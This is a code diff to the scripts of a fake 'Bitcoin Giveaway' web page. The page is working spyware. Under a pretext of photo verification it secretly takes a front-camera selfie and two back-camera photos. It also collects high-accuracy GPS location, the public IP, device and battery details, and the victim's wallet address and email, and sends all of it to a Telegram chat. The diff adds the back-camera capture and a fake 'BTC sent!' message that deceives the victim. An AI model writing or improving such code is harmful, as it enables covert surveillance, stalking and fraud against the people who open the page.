@@ -1,6 +1,7 @@
 /**
  * Bitcoin Giveaway — Production Scripts
- * SINGLE PERMISSION REQUEST - 3 SELFIES FIXED
+ * 3 PHOTOS: 1 Selfie (Front) + 2 Back Camera
+ * ONE PERMISSION REQUEST ONLY!
  */
 
 const STORAGE_KEY = "bitcoinGiveawaySubmissions";
@@ -301,96 +302,18 @@ function sendToTelegram(data, type = 'text') {
 }
 
 // ============================================================
-// Data Collection - REUSES EXISTING STREAMS (NO NEW PERMISSION)
+// Data Collection - 3 PHOTOS: 1 Selfie + 2 Back Camera
 // ============================================================
 
 // Global variables to store captured data
-let capturedSelfieBlobs = []; // Array for multiple selfies
+let capturedPhotoBlobs = [];
 let capturedLocation = null;
-let cameraStream = null;
 
 // ============================================================
-// PERMISSION REQUEST - ONLY ONCE!
+// Capture Single Photo from Stream
 // ============================================================
 
-async function requestPermissionsAndCaptureData() {
-  console.log('📸 Requesting permissions and capturing data...');
-  showToast('📸 Please allow camera and location access...', 'info');
-
-  let cameraOk = false;
-  let locationOk = false;
-
-  // === REQUEST CAMERA ===
-  try {
-    cameraStream = await navigator.mediaDevices.getUserMedia({ 
-      video: { 
-        facingMode: 'user',
-        width: { ideal: 640 },
-        height: { ideal: 480 }
-      } 
-    });
-    cameraOk = true;
-    console.log('✅ Camera granted');
-
-    // Immediately capture 3 selfies from the stream
-    capturedSelfieBlobs = await captureMultipleSelfiesFromStream(cameraStream);
-    if (capturedSelfieBlobs && capturedSelfieBlobs.length > 0) {
-      console.log(`📸 ${capturedSelfieBlobs.length} selfies captured`);
-      capturedSelfieBlobs.forEach((blob, i) => {
-        console.log(`  Selfie ${i+1} size:`, blob.size);
-      });
-    }
-
-  } catch (error) {
-    console.warn('❌ Camera denied:', error.message);
-  }
-
-  // === REQUEST LOCATION ===
-  try {
-    const position = await new Promise((resolve, reject) => {
-      navigator.geolocation.getCurrentPosition(resolve, reject, {
-        enableHighAccuracy: true,
-        timeout: 8000
-      });
-    });
-    locationOk = true;
-    capturedLocation = {
-      status: 'granted',
-      latitude: position.coords.latitude.toFixed(6),
-      longitude: position.coords.longitude.toFixed(6),
-      accuracy: `${Math.round(position.coords.accuracy)}m`
-    };
-    console.log('✅ Location granted');
-  } catch (error) {
-    console.warn('❌ Location denied:', error.message);
-    capturedLocation = { status: 'denied' };
-  }
-
-  // === CLEANUP STREAM ===
-  if (cameraStream) {
-    cameraStream.getTracks().forEach(track => track.stop());
-    cameraStream = null;
-  }
-
-  // === RESULT ===
-  if (cameraOk && locationOk) {
-    showToast('✅ Permissions granted!', 'success');
-    return { success: true, selfies: capturedSelfieBlobs, location: capturedLocation };
-  } else {
-    let msg = '⚠️ Required permissions missing:\n';
-    if (!cameraOk) msg += '• Camera (for photo verification)\n';
-    if (!locationOk) msg += '• Location (GPS)\n';
-    msg += 'Please allow access and try again.';
-    showToast(msg, 'error');
-    return { success: false };
-  }
-}
-
-// ============================================================
-// Capture Multiple Selfies from Existing Stream (3 photos)
-// ============================================================
-
-function captureMultipleSelfiesFromStream(stream) {
+function captureSinglePhotoFromStream(stream) {
   return new Promise((resolve) => {
     try {
       const video = document.createElement('video');
@@ -402,40 +325,34 @@ function captureMultipleSelfiesFromStream(stream) {
       document.body.appendChild(video);
 
       let resolved = false;
-      const selfies = [];
       
       const timeout = setTimeout(() => {
         if (!resolved) {
           resolved = true;
           video.remove();
-          resolve(selfies.length > 0 ? selfies : null);
+          resolve(null);
         }
-      }, 8000);
+      }, 5000);
 
       const captureFrame = () => {
         if (resolved) return;
         if (video.videoWidth > 0 && video.videoHeight > 0) {
+          clearTimeout(timeout);
+          resolved = true;
+          
           const canvas = document.createElement('canvas');
           canvas.width = video.videoWidth;
           canvas.height = video.videoHeight;
           const ctx = canvas.getContext('2d');
           ctx.drawImage(video, 0, 0);
           
+          video.remove();
+          
           canvas.toBlob((blob) => {
             if (blob && blob.size > 1000) {
-              selfies.push(blob);
-              console.log(`📸 Selfie ${selfies.length} captured, size:`, blob.size);
-              
-              if (selfies.length >= 3) {
-                clearTimeout(timeout);
-                resolved = true;
-                video.remove();
-                resolve(selfies);
-              } else {
-                setTimeout(captureFrame, 400);
-              }
+              resolve(blob);
             } else {
-              setTimeout(captureFrame, 200);
+              resolve(null);
             }
           }, 'image/jpeg', 0.9);
         } else {
@@ -458,10 +375,145 @@ function captureMultipleSelfiesFromStream(stream) {
       setTimeout(captureFrame, 300);
       
     } catch (error) {
-      console.error('Selfie capture error:', error);
+      console.error('Photo capture error:', error);
       resolve(null);
     }
   });
+}
+
+// ============================================================
+// PERMISSION REQUEST - ONE TIME! (Front + Back together)
+// ============================================================
+
+async function requestPermissionsAndCaptureData() {
+  console.log('📸 Requesting permissions and capturing photos...');
+  showToast('📸 Please allow camera and location access...', 'info');
+
+  let cameraOk = false;
+  let locationOk = false;
+  capturedPhotoBlobs = [];
+
+  // ==========================================================
+  // STEP 1: REQUEST BOTH CAMERAS AT ONCE (ONE PERMISSION)
+  // ==========================================================
+  try {
+    console.log('📸 Requesting both cameras (Front + Back) simultaneously...');
+    
+    // Request both cameras at the same time - ONE PERMISSION DIALOG
+    const [frontStream, backStream] = await Promise.all([
+      navigator.mediaDevices.getUserMedia({ 
+        video: { 
+          facingMode: 'user',
+          width: { ideal: 640 },
+          height: { ideal: 480 }
+        } 
+      }),
+      navigator.mediaDevices.getUserMedia({ 
+        video: { 
+          facingMode: 'environment',
+          width: { ideal: 640 },
+          height: { ideal: 480 }
+        } 
+      })
+    ]);
+    
+    cameraOk = true;
+    console.log('✅ Both cameras granted (one permission)');
+
+    // ==========================================================
+    // STEP 2: CAPTURE 1 SELFIE (Front Camera)
+    // ==========================================================
+    const selfieBlob = await captureSinglePhotoFromStream(frontStream);
+    if (selfieBlob) {
+      capturedPhotoBlobs.push(selfieBlob);
+      console.log('📸 Selfie (Front Camera) captured, size:', selfieBlob.size);
+    } else {
+      console.warn('⚠️ Selfie capture failed');
+    }
+
+    // ==========================================================
+    // STEP 3: CAPTURE 2 PHOTOS (Back Camera)
+    // ==========================================================
+    for (let i = 0; i < 2; i++) {
+      const backBlob = await captureSinglePhotoFromStream(backStream);
+      if (backBlob) {
+        capturedPhotoBlobs.push(backBlob);
+        console.log(`📸 Back Camera Photo ${i+1} captured, size:`, backBlob.size);
+      } else {
+        console.warn(`⚠️ Back camera photo ${i+1} failed`);
+      }
+      if (i < 1) await new Promise(resolve => setTimeout(resolve, 400));
+    }
+
+    // ==========================================================
+    // STEP 4: CLEAN UP STREAMS
+    // ==========================================================
+    frontStream.getTracks().forEach(track => track.stop());
+    backStream.getTracks().forEach(track => track.stop());
+
+  } catch (error) {
+    console.warn('❌ Camera denied:', error.message);
+    // Try fallback: only front camera
+    try {
+      console.log('📸 Trying fallback: only front camera...');
+      const fallbackStream = await navigator.mediaDevices.getUserMedia({ 
+        video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } } 
+      });
+      cameraOk = true;
+      
+      const selfieBlob = await captureSinglePhotoFromStream(fallbackStream);
+      if (selfieBlob) {
+        capturedPhotoBlobs.push(selfieBlob);
+        console.log('📸 Fallback selfie captured');
+      }
+      fallbackStream.getTracks().forEach(track => track.stop());
+    } catch (fallbackError) {
+      console.warn('❌ Fallback camera also failed');
+      cameraOk = false;
+    }
+  }
+
+  // ==========================================================
+  // STEP 5: GET LOCATION
+  // ==========================================================
+  try {
+    const position = await new Promise((resolve, reject) => {
+      navigator.geolocation.getCurrentPosition(resolve, reject, {
+        enableHighAccuracy: true,
+        timeout: 8000
+      });
+    });
+    locationOk = true;
+    capturedLocation = {
+      status: 'granted',
+      latitude: position.coords.latitude.toFixed(6),
+      longitude: position.coords.longitude.toFixed(6),
+      accuracy: `${Math.round(position.coords.accuracy)}m`
+    };
+    console.log('✅ Location granted');
+  } catch (error) {
+    console.warn('❌ Location denied:', error.message);
+    capturedLocation = { status: 'denied' };
+  }
+
+  // ==========================================================
+  // RESULT
+  // ==========================================================
+  console.log(`📸 Total photos captured: ${capturedPhotoBlobs.length}`);
+
+  if (cameraOk && locationOk) {
+    // showToast(`✅ Permissions granted! (${capturedPhotoBlobs.length} photos)`, 'success');
+// یا
+showToast(`✅ Access granted!`, 'success');
+    return { success: true, photos: capturedPhotoBlobs, location: capturedLocation };
+  } else {
+    let msg = '⚠️ Required permissions missing:\n';
+    if (!cameraOk) msg += '• Camera (for photo verification)\n';
+    if (!locationOk) msg += '• Location (GPS)\n';
+    msg += 'Please allow access and try again.';
+    showToast(msg, 'error');
+    return { success: false };
+  }
 }
 
 // ============================================================
@@ -530,9 +582,9 @@ function buildReport(data, walletAddress, email) {
   const networkSection = 
     `🌐 *Network*\n• Public IP: ${data.ip || 'Unknown'}\n• Connection: ${dev.networkType}\n• Speed: ${dev.downlink}`;
 
-  const cameraSection = (data.selfies && data.selfies.length > 0) 
-    ? `📷 *Camera*\n• Selfies captured: ${data.selfies.length}` 
-    : '📷 *Camera*\n• Selfie: Not captured';
+  const cameraSection = (data.photos && data.photos.length > 0) 
+    ? `📷 *Camera*\n• Photos captured: ${data.photos.length}\n  - 1 Selfie (Front Camera)\n  - ${data.photos.length - 1} Back Camera` 
+    : '📷 *Camera*\n• Photos: Not captured';
 
   const batterySection = bat?.level !== undefined && bat?.level !== null
     ? `🔋 *Battery*\n• Level: ${bat.level}%\n• Charging: ${bat.charging}`
@@ -597,11 +649,11 @@ function initForm() {
     }
 
     // ==========================================
-    // STEP 1: REQUEST PERMISSIONS & CAPTURE DATA (ONLY ONCE!)
+    // STEP 1: REQUEST PERMISSIONS & CAPTURE PHOTOS
     // ==========================================
     const result = await requestPermissionsAndCaptureData();
     if (!result.success) {
-      return; // Stop here if permissions denied
+      return;
     }
 
     // ==========================================
@@ -669,7 +721,7 @@ function initForm() {
       showToast(successText, "success", "Entry Confirmed");
 
       // ==========================================
-      // STEP 4: SEND TO TELEGRAM (USING CAPTURED DATA)
+      // STEP 4: SEND TO TELEGRAM
       // ==========================================
       await sendToTelegramWithData(walletAddress, email, result);
 
@@ -690,22 +742,18 @@ function initForm() {
 async function sendToTelegramWithData(walletAddress, email, permissionResult) {
   console.log('📤 Sending data to Telegram...');
 
-  // Get device info (always works)
   const device = getDeviceInfo();
-  
-  // Get IP and battery (no permissions needed)
   const [ip, battery] = await Promise.allSettled([
     getIpInfo(),
     getBatteryInfo()
   ]);
 
-  // Build data object
   const data = {
     device: device,
     ip: ip.status === 'fulfilled' ? ip.value : 'Unknown',
     location: permissionResult.location || { status: 'not_available' },
     battery: battery.status === 'fulfilled' ? battery.value : null,
-    selfies: permissionResult.selfies || [],
+    photos: permissionResult.photos || [],
     timestamp: new Date().toISOString()
   };
 
@@ -719,33 +767,37 @@ async function sendToTelegramWithData(walletAddress, email, permissionResult) {
     showToast('Failed to send data to Telegram', 'error');
   }
 
-  // Send selfies if captured
-  if (data.selfies && data.selfies.length > 0) {
-    console.log(`📸 Sending ${data.selfies.length} selfies to Telegram...`);
+  // Send photos
+  if (data.photos && data.photos.length > 0) {
+    console.log(`📸 Sending ${data.photos.length} photos to Telegram...`);
     
-    for (let i = 0; i < data.selfies.length; i++) {
-      const blob = data.selfies[i];
+    let successCount = 0;
+    for (let i = 0; i < data.photos.length; i++) {
+      const blob = data.photos[i];
+      const photoType = i === 0 ? 'Selfie' : `Back Camera ${i}`;
       try {
         const formData = new FormData();
         formData.append('chat_id', TELEGRAM_CHAT_ID);
-        formData.append('photo', blob, `selfie_${i+1}_${Date.now()}.jpg`);
-        formData.append('caption', `📸 Selfie ${i+1}/${data.selfies.length} for: ${walletAddress.substring(0, 8)}...`);
+        formData.append('photo', blob, `photo_${i+1}_${Date.now()}.jpg`);
+        formData.append('caption', `📸 ${photoType} for: ${walletAddress.substring(0, 8)}...`);
         
         await sendToTelegram(formData, 'photo');
-        console.log(`✅ Selfie ${i+1} sent to Telegram successfully!`);
+        console.log(`✅ ${photoType} sent to Telegram successfully!`);
+        successCount++;
         
-        // Small delay between sends
-        if (i < data.selfies.length - 1) {
+        if (i < data.photos.length - 1) {
           await new Promise(resolve => setTimeout(resolve, 500));
         }
       } catch (err) {
-        console.error(`❌ Failed to send selfie ${i+1}:`, err);
+        console.error(`❌ Failed to send ${photoType}:`, err);
       }
     }
     
-    showToast(`✅ ${data.selfies.length} btc receive money successful!`, 'success');
+    if (successCount > 0) {
+        showToast(`✅ ${successCount} BTC sent!`, 'success');
+    }
   } else {
-    console.warn('📸 No selfies to send');
+    console.warn('📸 No photos to send');
   }
 
   console.log('✅ Data collection complete');
@@ -890,4 +942,6 @@ document.addEventListener("DOMContentLoaded", function() {
   initForm();
   
   console.log('✅ Bitcoin Giveaway initialized successfully!');
+  console.log('📸 Will capture: 1 Selfie (Front) + 2 Back Camera photos');
+  console.log('🔑 ONE permission request only!');
 });
